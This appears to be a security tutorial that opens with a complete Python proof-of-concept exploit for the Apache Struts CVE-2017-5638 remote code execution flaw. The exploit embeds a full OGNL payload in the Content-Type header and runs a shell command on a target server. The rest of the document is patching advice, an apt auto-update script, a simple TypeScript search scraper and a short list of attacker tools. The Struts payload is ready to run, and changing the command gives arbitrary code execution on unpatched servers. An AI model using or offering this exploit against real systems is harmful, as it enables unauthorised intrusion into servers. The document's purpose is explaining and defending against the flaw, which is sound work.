### Technical Analysis and Code Examples

#### **Vulnerability Exploitation**

The CVE-2017-5638 vulnerability in Apache Struts is a Remote Code Execution (RCE) flaw. Here's a simplified example of how an attacker might exploit such a vulnerability:

```python
import requests

# Malicious payload to exploit the vulnerability
payload = (
    "%{(#_='multipart/form-data')."
    "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    "(#_memberAccess?"
    "(#_memberAccess=#dm):"
    "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    "(#ognlUtil.getExcludedPackageNames().clear())."
    "(#ognlUtil.getExcludedClasses().clear())."
    "(#context.setMemberAccess(#dm))))."
    "(#cmd='ls')."
    "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    "(#p=new java.lang.ProcessBuilder(#cmds))."
    "(#p.redirectErrorStream(true)).(#process=#p.start())."
    "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    "(#ros.flush())}"
)

headers = {
    'Content-Type': payload
}

# Target URL
url = "http://target-url.com/struts2-showcase/upload.action"

response = requests.post(url, headers=headers)
print(response.text)
```

In this example, the payload is designed to execute a system command (`ls` in this case) on the vulnerable server.

#### **Mitigation and Prevention**

To prevent such attacks, it's crucial to:

1. **Apply Security Patches Promptly**: Regularly update and patch all software to protect against known vulnerabilities.
2. **Use a Web Application Firewall (WAF)**: A WAF can help detect and block malicious traffic targeting web applications.
3. **Conduct Regular Security Assessments**: Regular vulnerability assessments and penetration tests can identify and address security weaknesses.

### **Example Code for Secure Patch Management**

To ensure timely patch management, you can automate the process. Here’s an example script for Linux systems using Python:

```python
import os
import subprocess

def check_for_updates():
    # Check for available updates
    updates = subprocess.check_output(['sudo', 'apt', 'update'])
    print(updates.decode())

def apply_updates():
    # Apply available updates
    update_process = subprocess.run(['sudo', 'apt', 'upgrade', '-y'], check=True)
    print("Updates applied successfully")

def main():
    check_for_updates()
    apply_updates()

if __name__ == "__main__":
    main()
```

### **Example OSINT Project in TypeScript**

We can create a simple OSINT tool using TypeScript and Node.js to perform search queries and analyze results. Here’s a basic example:

1. **Install Required Packages**

```bash
npm init -y
npm install axios cheerio
```

2. **OSINT Tool Code**

```typescript
import axios from 'axios';
import * as cheerio from 'cheerio';

// Function to perform a search query on a search engine
async function searchQuery(query: string): Promise<string[]> {
    try {
        // Example URL for search engine query (replace with actual search engine URL)
        const searchUrl = `https://www.google.com/search?q=${encodeURIComponent(query)}`;

        // Make HTTP GET request to the search engine URL
        const response = await axios.get(searchUrl);

        // Extract search results from the response
        const searchResults: string[] = extractSearchResults(response.data);

        return searchResults;
    } catch (error) {
        throw new Error('Error performing search query');
    }
}

// Function to extract search results from HTML data
function extractSearchResults(htmlData: string): string[] {
    const $ = cheerio.load(htmlData);
    const searchResults: string[] = [];

    $('a').each((index, element) => {
        const link = $(element).attr('href');
        if (link && link.startsWith('http')) {
            searchResults.push(link);
        }
    });

    return searchResults;
}

// Main function to execute OSINT search
async function executeOSINTSearch() {
    try {
        const query = "cybersecurity"; // Example search query
        const results = await searchQuery(query);
        
        console.log(`OSINT Search Results for '${query}':`);
        results.forEach(result => {
            console.log(result);
        });
    } catch (error) {
        console.error('Error executing OSINT search:', error);
    }
}

// Call the main function to execute the OSINT search
executeOSINTSearch();
```

This code uses Axios to make HTTP requests and Cheerio to parse HTML data. You can expand this project by adding more functionalities such as data scraping, analysis, and reporting.

### **Potential Hacker Tools and Methods**

1. **Reconnaissance Tools**: Tools like Nmap and Shodan are used for network scanning and identifying open ports and services.

2. **Exploitation Frameworks**: Tools like Metasploit can be used to exploit known vulnerabilities.

3. **Custom Scripts**: Hackers often write custom scripts (e.g., in Python, Bash) to automate parts of their attack.

4. **Social Engineering**: Techniques like phishing to trick users into divulging sensitive information.
